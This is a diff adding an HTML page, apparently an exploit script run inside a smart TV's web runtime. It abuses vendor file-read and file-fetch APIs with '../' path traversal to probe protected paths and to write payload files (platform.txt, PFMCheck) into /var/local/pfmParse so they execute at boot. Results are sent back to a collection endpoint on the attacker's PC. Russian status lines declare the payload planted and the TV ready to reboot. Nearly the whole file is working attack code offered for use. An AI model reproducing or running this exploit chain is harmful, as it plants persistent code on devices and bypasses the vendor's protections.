@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>alvidaa plant</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 10px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+  .big { font-size: 26px; font-weight: bold; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<script>
+(function () {
+  "use strict";
+  /*
+   * WRITE STEP. Two stages:
+   *   1. nested-dir test  -> /var/local/alvidaa_t/a/b/marker.txt
+   *   2. if (1) works, plant the PFM lane:
+   *        /var/local/pfmParse/Data/platform.txt
+   *        /var/local/pfmParse/PFMCheck
+   * Nothing runs until the TV boots. Nothing outside /var/local is touched.
+   * Reads nothing protected. Posts the whole report to /collect on the PC.
+   */
+  var SRV = "http://" + location.host;
+  var MARKER = SRV + "/pub/marker.txt";
+  var PLATFORM = SRV + "/pub/pfm-65a85q/platform.txt";
+  var PFMCHECK = SRV + "/pub/pfm-65a85q/PFMCheck";
+
+  var el = document.getElementById("out");
+  var rep = { started: new Date().toISOString(), ua: navigator.userAgent, steps: {} };
+
+  function out(t, c) {
+    var d = document.createElement("div");
+    d.textContent = t;
+    if (c) d.className = c;
+    el.appendChild(d);
+    window.scrollTo(0, document.body.scrollHeight);
+  }
+  function norm(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
+  }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+  function rd(p) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: [p], mode: 6 });
+      if (r && typeof r === "object") return { ret: r.ret, msg: norm(r.msg) };
+      return { ret: true, msg: norm(r) };
+    } catch (e) { return { ret: false, msg: "EXC " + e }; }
+  }
+  async function rdWait(p, tries) {
+    var r = null;
+    for (var i = 0; i < (tries || 4); i++) {
+      r = rd(p);
+      if (r.ret === true) return r;
+      await sleep(800);
+    }
+    return r;
+  }
+  async function fetchTo(url, target) {
+    var args = { url: url, directory: target, permission: 420 };
+    var res;
+    try {
+      res = await Promise.resolve(vowOS.service.syncExecute("basic/fetcher",
+        { api: "fetchFile", args: JSON.stringify(args) }));
+    } catch (e) { res = "EXC " + e; }
+    var s = norm(res);
+    return { ret: (res && res.ret === true) || s.indexOf("download") !== -1, msg: s.slice(0, 200) };
+  }
+  async function post() {
+    try {
+      var x = await fetch("/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(rep)
+      });
+      return "HTTP " + x.status;
+    } catch (e) { return "EXC " + e; }
+  }
+
+  async function main() {
+    out("alvidaa plant — " + new Date().toISOString(), "hdr");
+    out("");
+
+    out("0) current state", "hdr");
+    ["../var/local/pfmParse", "../var/local/pfmParse/PFMCheck",
+     "../var/local/pfmParse/Data/platform.txt", "../var/local/DebugPowerup"].forEach(function (p) {
+      var r = rd(p);
+      rep.steps[p] = r;
+      out("   " + (r.ret === true ? "[EXISTS] " : "[--]     ") + p + "   " +
+          String(r.msg).replace(/\s+/g, " ").slice(0, 110), r.ret === true ? "ok" : "warn");
+    });
+    out("");
+
+    out("1) can fetchFile create nested dirs?", "hdr");
+    var testTarget = "/var/local/alvidaa_t/a/b/marker.txt";
+    var f1 = await fetchTo(MARKER, testTarget);
+    rep.steps.fetchNested = f1;
+    out("   fetch -> " + testTarget + "   " + f1.msg, f1.ret ? "ok" : "err");
+    var r1 = await rdWait("../var/local/alvidaa_t/a/b/marker.txt", 5);
+    rep.steps.nestedReadback = r1;
+    var nestedOk = r1.ret === true && String(r1.msg).length > 0;
+    out("   readback: " + (nestedOk ? "FILE PRESENT" : "ABSENT") + "   " +
+        String(r1.msg).replace(/\s+/g, " ").slice(0, 130), nestedOk ? "ok" : "err");
+    if (!nestedOk) {
+      var d1 = rd("../var/local/alvidaa_t");
+      rep.steps.nestedDirProbe = d1;
+      out("   probe ../var/local/alvidaa_t -> " + String(d1.msg).replace(/\s+/g, " ").slice(0, 110), "warn");
+    }
+    out("");
+
+    if (!nestedOk) {
+      out("ВЕРДИКТ: fetchFile НЕ создаёт каталоги — эту ветку надо менять", "err big");
+      await post();
+      return;
+    }
+
+    out("2) planting the PFM lane", "hdr");
+    var f2 = await fetchTo(PLATFORM, "/var/local/pfmParse/Data/platform.txt");
+    rep.steps.fetchPlatform = f2;
+    out("   platform.txt: " + f2.msg, f2.ret ? "ok" : "err");
+    var r2 = await rdWait("../var/local/pfmParse/Data/platform.txt", 6);
+    rep.steps.platformReadback = r2;
+    var platOk = r2.ret === true && String(r2.msg).indexOf("runMaxCount=1") !== -1;
+    out("   readback: " + (platOk ? "OK (" + String(r2.msg).length + " chars)" : "BAD") + "   " +
+        String(r2.msg).replace(/\s+/g, " ").slice(0, 90), platOk ? "ok" : "err");
+
+    var f3 = await fetchTo(PFMCHECK, "/var/local/pfmParse/PFMCheck");
+    rep.steps.fetchPfmcheck = f3;
+    out("   PFMCheck: " + f3.msg, f3.ret ? "ok" : "err");
+    var r3 = await rdWait("../var/local/pfmParse/PFMCheck", 6);
+    rep.steps.pfmcheckReadback = r3;
+    var pfOk = r3.ret === true && String(r3.msg).indexOf("runCount=99") !== -1;
+    out("   readback: " + (pfOk ? "OK (" + String(r3.msg).length + " chars)" : "BAD") + "   " +
+        String(r3.msg).replace(/\s+/g, " ").slice(0, 90), pfOk ? "ok" : "err");
+
+    var ddir = rd("../var/local/pfmParse/Data");
+    rep.steps.dirProbe = ddir;
+    out("   probe ../var/local/pfmParse/Data -> " + String(ddir.msg).replace(/\s+/g, " ").slice(0, 90),
+        ddir.msg && ddir.msg.indexOf("EISDIR") !== -1 ? "ok" : "warn");
+    out("");
+
+    var armed = platOk && pfOk;
+    rep.verdict = armed ? "ARMED" : "PARTIAL";
+    var up = await post();
+    out(armed ? "ГОТОВО: payload посажен — можно перезагружать ТВ" : "НЕ ПОЛНОСТЬЮ — смотри выше",
+        armed ? "ok big" : "err big");
+    out("report " + up, "hdr");
+  }
+
+  main().catch(function (e) {
+    rep.fatal = String(e);
+    out("FATAL " + e, "err");
+    post();
+  });
+})();
+</script>
+</body>
+</html>
